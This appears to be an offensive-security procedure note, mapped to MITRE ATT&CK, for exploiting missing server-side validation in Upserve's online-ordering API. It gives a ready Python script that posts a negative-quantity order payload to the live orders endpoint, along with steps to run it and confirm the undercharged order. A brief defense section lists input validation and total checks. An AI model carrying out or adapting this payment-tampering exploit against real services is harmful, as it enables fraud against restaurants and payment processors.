---
id: proc-upserve-submit-json
tags:
  - api-submission
  - post-request
  - payload-tampering
type: procedure
tools:
  - '[[tools/order-py]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.497Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Manipulated-JSON-to-Order-API

## Summary

This procedure submits the tampered JSON payload to Upserve's OLO order submission endpoint, leveraging the lack of server-side validation to process orders at manipulated reduced totals.

## Description

The Upserve OLO API accepts POST requests with JSON payloads containing order details. Exploitation involves sending payloads with negative quantities or low prices, including elements like store_pretty_url, submission_id, customer info, fulfillment details, and payments. The system charges based on the provided total without verifying inputs, resulting in financial discrepancies.

## Requirements

1. API endpoint access (inferred as /orders or similar in Upserve OLO).
2. Python environment with requests library for HTTP POST.
3. Valid session or API key if required for authenticated orders.

## Defense

Defensive measures and detection strategies:

- Enforce input sanitization on quantity (positive integers only) and price fields.
- Cross-verify payload totals against server-computed values using fixed catalog prices.
- Log and alert on submissions with unusual totals or negative values.

## Objectives

1. Deliver the manipulated payload to the server.
2. Obtain order confirmation without rejection.
3. Initiate processing leading to undercharged payments.

## Instructions

### Step 1: Prepare Submission Script

**Context**: Use [[tools/order-py]] to construct the full payload with tampered charges.

Example Python code snippet:

```python
import requests

payload = {
    "store_pretty_url": "upserve-lounge-test-providence-2",
    "submission_id": "unique-id",
    "charges": {
        "items": [
            {"name": "ChickenBurger", "quantity": 2, "price": 1200},
            {"name": "BreadPudding", "quantity": -1, "price": 900}
        ],
        "taxes": 290,
        "total": 1870
    },
    "customer": {"name": "Test", "address": "..."},
    "fulfillment_info": {"type": "delivery"},
    "payments": [{"amount": 1870}]
}

response = requests.post("https://api.upserve.com/orders", json=payload)
print(response.json())
```

> This sends the POST request; expect confirmation_code in response.

### Step 2: Execute Submission

**Context**: Run the script to POST the payload.

Execute: `python order.py`

> Expected: 200 OK with order details.

### Step 3: Handle Response

**Context**: Parse the API response for success indicators.

Check for fields like confirmation_code (e.g., 'upserve-hacker-cafe-32870').

> Success if no validation errors and order ID returned.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/order-py]]

## Tags

- [[api-submission]]
- [[post-request]]
